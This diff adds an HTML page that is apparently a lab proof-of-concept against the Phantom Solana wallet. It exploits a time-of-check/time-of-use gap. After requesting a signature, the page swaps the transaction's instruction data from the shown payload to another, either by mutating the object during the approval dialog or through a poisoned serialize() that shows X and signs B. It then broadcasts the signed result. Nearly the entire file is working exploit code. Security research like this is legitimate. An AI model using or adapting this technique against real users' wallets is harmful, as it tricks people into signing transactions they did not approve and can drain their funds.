@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<title>SimLab TOCTOU dApp</title>
+<style>
+body{font-family:system-ui;background:#0b0e12;color:#eee;margin:0;padding:16px}
+h1{font-size:18px}
+button{display:block;width:100%;padding:14px;margin:8px 0;font-size:16px;border:none;border-radius:12px;background:#4e44ce;color:#fff}
+button:disabled{opacity:.5}
+pre{white-space:pre-wrap;font-family:monospace;font-size:11px;margin-top:10px;background:#000;padding:10px;border-radius:8px;overflow:auto;max-height:60vh}
+.tip{color:#9aa;font-size:13px}
+mark{background:#553;color:#ff8}
+</style>
+</head>
+<body>
+<h1>SimLab TOCTOU dApp (scn5)</h1>
+<p class="tip">provider: <span id="pp">loading…</span></p>
+<button id="btn">1. Connect Wallet</button>
+<button id="btnRun" disabled>2. Request Signature for X — then SWAP to B</button>
+<p class="tip">mode: <span id="md">…</span>  swap delay: <span id="sdt">…</span> ms</p>
+<p class="tip">Last signature: <input id="sig" readonly style="width:100%;background:#000;color:#0f0;border:none"></p>
+<pre id="log">ready</pre>
+
+<script src="/web3.js"></script>
+<script>
+function $(id){return document.getElementById(id);}
+function getQuery(){
+  var q=new URLSearchParams(location.search);
+  return {
+    prog: q.get('prog')||'iXYwr5sPrDvASNSvuHwsZAJc5bvqruFYcL7XKsszj5C',  // scn5 disguised
+    mode: q.get('mode')||'mutate',     // honest | mutate | proxy
+    swapms: parseInt(q.get('swapms')||'3000',10),
+    len:  parseInt(q.get('len')||'16',10),
+    rpc:  q.get('rpc')||location.origin  // same-origin tunnel relay -> lab validator
+  };
+}
+var CFG=getQuery();
+var L=(function(){var l=document.getElementById('log');return function(m){l.textContent+='\n'+m;l.scrollTop=l.scrollHeight;};})();
+function provider(){return window.solana||(window.phantom&&window.phantom.solana)||null;}
+var P=null;
+function refresh(){
+  P=provider();
+  var pp=document.getElementById('pp');
+  if(P){ pp.textContent='present: '+((P.isPhantom)?'Phantom':'UNKNOWN')+(P.isConnected?' (connected)':''); }
+  else { pp.textContent='MISSING (no window.solana)'; }
+  var btn=document.getElementById('btn');
+  btn.disabled=!P;
+  L('provider = '+pp.textContent);
+  if(P&&!P.isConnected){
+    P.on('connect',function(){ L('onconnect fired'); document.getElementById('btnRun').disabled=false; });
+  }
+}
+function ensureWeb3(cb){
+  if(window.solanaWeb3){cb();return;}
+  L('loading web3.js …');
+  var s=document.createElement('script');
+  s.src='/web3.js';
+  s.onload=function(){ L('web3 loaded'); cb(); };
+  s.onerror=function(){ L('web3 ERR'); };
+  document.head.appendChild(s);
+}
+function onConnect(){
+  var p=provider(); if(!p){L('[[dialog-done]]');return;}
+  p.connect().then(function(resp){
+    var pk=(resp&&(resp.publicKey||resp.pubkey));
+    L('connected pubkey='+String(pk||'?')+' isPhantom='+p.isPhantom);
+    document.getElementById('btnRun').disabled=false;
+  }).catch(function(e){L('connect ERR: '+e.message);L('[[dialog-done]]');});
+}
+
+// ---- swap payload builders ----
+function buildData(tag, len){
+  // X: tag=0 ... B: tag=1 ... fixed lab payload
+  var d=new Uint8Array(1+len);
+  d[0]=tag;
+  return d;
+}
+
+// Poisoned serialize for 'proxy' mode: first call returns X bytes (what the
+// wallet previews/simulates), subsequent calls return B bytes (what it signs).
+function poisonSerialize(tx, W, len){
+  var n=0;
+  var orig=tx.serialize.bind(tx);
+  tx.serialize=function(opts){
+    n++;
+    if(n===1){
+      tx.instructions[0].data=buildData(0,len); // X
+      L('proxy serialize #'+n+' -> X (tag 0)');
+    } else {
+      tx.instructions[0].data=buildData(1,len); // B
+      L('proxy serialize #'+n+' -> B (tag 1) <-- swap');
+    }
+    return orig(opts);
+  };
+  tx.__serializeCalls=function(){return n;};
+}
+
+var running=false;
+function onRun(){
+  var p=provider(); if(!p)return;
+  ensureWeb3(function(){
+    var W=window.solanaWeb3; if(!W)return;
+    var conn=new W.Connection(CFG.rpc,'confirmed');
+    L('fetch recentBlockhash from '+CFG.rpc);
+    conn.getRecentBlockhash('confirmed').then(function(res){
+      var blockhash=res.blockhash;
+      var prog=new W.PublicKey(CFG.prog);
+      var feePayer=p.publicKey;
+      var tx=new W.Transaction({feePayer:feePayer, recentBlockhash:blockhash});
+      tx.add({keys:[
+        {pubkey:feePayer,isSigner:true,isWritable:true},
+        {pubkey:W.SystemProgram.programId,isSigner:false,isWritable:false}
+      ],programId:prog,
+        data:buildData(0,CFG.len)});   // X first (what the user should see)
+      L('blockhash='+blockhash);
+      L('built X: tag=0, data.len='+(1+CFG.len)+' prog='+CFG.prog);
+
+      if(CFG.mode==='proxy'){
+        poisonSerialize(tx, W, CFG.len);
+      }
+
+      var t0=Date.now();
+      L('signTransaction(X) via Phantom… (t0='+t0+')');
+      var pSign=p.signTransaction(tx);
+
+      if(CFG.mode==='mutate'){
+        // The TOCTOU: swap the live object to B after a delay, i.e. while the
+        // wallet's approval dialog is open / between preview and sign.
+        setTimeout(function(){
+          var dt=Date.now()-t0;
+          tx.instructions[0].data=buildData(1,CFG.len);
+          L('>>> SWAP in-place at t+'+dt+'ms: instructions[0].data -> B (tag=1)');
+        }, CFG.swapms);
+      }
+
+      return pSign.then(function(signed){
+        var t1=Date.now();
+        L('signed OK at t+'+(t1-t0)+'ms');
+        // Which tag did the wallet ACTUALLY sign? Parse the returned object.
+        try {
+          var sigTag = signed.instructions && signed.instructions[0]
+            ? signed.instructions[0].data[0] : -1;
+          L('RETURNED signed.instructions[0].data[0] = '+sigTag+
+            '   <-- the bytes Phantom signed ('+(sigTag===0?'X = approved surface':sigTag===1?'B = SWAPPED/MALICIOUS':'unknown')+')');
+          L('returned type='+(signed.constructor&&signed.constructor.name)+' keys='+(Object.keys(signed).join(',')||'').slice(0,140));
+          var insts = signed.instructions||(signed.message&&signed.message.instructions)||[];
+          L('nInstructions='+(insts.length));
+          for(var i=0;i<insts.length&&i<4;i++){
+            var it=insts[i]; var dat=it.data||[]; var hex='';
+            for(var j=0;j<Math.min(dat.length,32);j++){ hex+=('0'+((dat[j]&0xff)>>>0).toString(16)).slice(-2); }
+            L('  inst#'+i+' prog='+String(it.programId)+' data.len='+dat.length+' hex='+hex+' data[0]='+(dat[0]===undefined?'undef':dat[0]));
+          }
+          if(signed.signatures){ L('signatures='+signed.signatures.length+' first='+String(signed.signatures[0])); }
+          if(signed.feePayer){ L('feePayer='+String(signed.feePayer)); }
+          if(signed.recentBlockhash){ L('recentBlockhash='+String(signed.recentBlockhash)); }
+        } catch(e){ L('parse signed failed: '+e); }
+        L('serialize signed for broadcast…');
+        var raw=signed.serialize();
+        L('raw bytes='+raw.length);
+        var bc=new W.Connection(CFG.rpc,'confirmed');
+        return bc.sendRawTransaction(raw);
+      }).then(function(sig){
+        L('SENT sig='+sig);
+        document.getElementById('sig').value=sig;
+        var cc=new W.Connection(CFG.rpc,'confirmed');
+        return cc.confirmTransaction(sig,'confirmed').then(function(conf){
+          L('CONFIRMED err='+((conf.value&&conf.value.err)||'ok'));
+          L('[[SIG]] '+sig);
+        });
+      });
+    }).catch(function(e){ L('ERR: '+e); })
+      .finally(function(){ L('[[dialog-done]]'); running=false; });
+  });
+}
+function main(){
+  L('web3 '+(window.solanaWeb3?'preloaded':'pending'));
+  L('rpc='+CFG.rpc+' prog='+CFG.prog);
+  document.getElementById('md').textContent=CFG.mode;
+  document.getElementById('sdt').textContent=CFG.swapms;
+  refresh();
+}
+document.addEventListener('DOMContentLoaded',function(){
+  document.getElementById('btn').addEventListener('click',onConnect);
+  document.getElementById('btnRun').addEventListener('click',onRun);
+  main();
+});
+setTimeout(main,1500);
+setTimeout(function(){ if(!P){ refresh(); } },4000);
+</script>
+</body>
+</html>
